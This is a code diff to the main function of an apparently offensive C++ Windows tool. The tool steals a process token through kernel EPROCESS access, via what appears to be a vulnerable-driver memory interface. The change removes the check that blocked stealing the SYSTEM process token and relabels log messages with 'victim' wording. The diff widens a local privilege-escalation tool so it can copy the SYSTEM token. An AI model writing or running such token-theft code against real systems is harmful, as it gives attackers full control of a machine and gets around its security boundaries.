@@ -16,10 +16,6 @@ int32_t main(int32_t argc, const char** argv) {
     }
 
     const auto victim_pid = std::stoi(argv[1]);
-    if (victim_pid == SYSTEM_PID) {
-        std::cout << std::format("[!] Unable to hijack ntoskrnl token! {}", victim_pid) << std::endl;
-        return 1;
-    }
 
     const auto target_pid = std::stoi(argv[2]);
     if (target_pid == SYSTEM_PID) {
@@ -45,7 +41,7 @@ int32_t main(int32_t argc, const char** argv) {
         return 1;
     }
 
-    std::cout << std::format("[*] Target process EProcess: 0x{:X}", victim_e_process) << std::endl;
+    std::cout << std::format("[*] Victim process EProcess: 0x{:X}", victim_e_process) << std::endl;
 
     const auto target_e_process = vdm->fetch_e_process(target_pid);
     if (!target_e_process) {
@@ -56,10 +52,10 @@ int32_t main(int32_t argc, const char** argv) {
     std::cout << std::format("[*] Target process EProcess: 0x{:X}", target_e_process) << std::endl;
 
     if (!vdm->steal_token(victim_e_process, target_e_process)) {
-        std::cout << "[!] Failed to steal target process token" << std::endl;
+        std::cout << "[!] Failed to steal victim process token" << std::endl;
         return 1;
     }
 
-    std::cout << "[*] Target process token stolen!" << std::endl;
+    std::cout << "[*] Victim process token stolen!" << std::endl;
     return 0;
 }
